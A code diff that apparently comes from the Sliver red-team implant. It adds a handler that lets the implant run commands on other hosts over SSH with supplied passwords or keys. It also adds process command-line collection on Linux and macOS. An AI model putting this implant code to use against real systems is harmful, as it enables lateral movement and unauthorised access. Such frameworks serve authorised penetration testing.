@@ -32,6 +32,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/screen"
+	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -72,6 +73,12 @@ func psHandler(data []byte, resp RPCResponse) {
 		}
 		// {{if eq .Config.GOOS "windows"}}
 		p.SessionID = int32(proc.(*ps.WindowsProcess).SessionID())
+		// {{end}}
+		// {{if eq .Config.GOOS "linux"}}
+		p.CmdLine = proc.(*ps.UnixProcess).CmdLine()
+		// {{end}}
+		// {{if eq .Config.GOOS "darwin"}}
+		p.CmdLine = proc.(*ps.DarwinProcess).CmdLine()
 		// {{end}}
 		psList.Processes = append(psList.Processes, p)
 	}
@@ -335,4 +342,31 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 	}
 	return entries
 
+}
+
+func runSSHCommandHandler(data []byte, resp RPCResponse) {
+	commandReq := &sliverpb.SSHCommandReq{}
+	err := proto.Unmarshal(data, commandReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %s\n", err.Error())
+		// {{end}}
+		return
+	}
+	stdout, stderr, err := ssh.RunSSHCommand(commandReq.Hostname,
+		uint16(commandReq.Port),
+		commandReq.Username,
+		commandReq.Password,
+		commandReq.PrivKey,
+		commandReq.Command)
+	commandResp := &sliverpb.SSHCommand{
+		Response: &commonpb.Response{},
+		StdOut:   stdout,
+		StdErr:   stderr,
+	}
+	if err != nil {
+		commandResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(commandResp)
+	resp(data, err)
 }
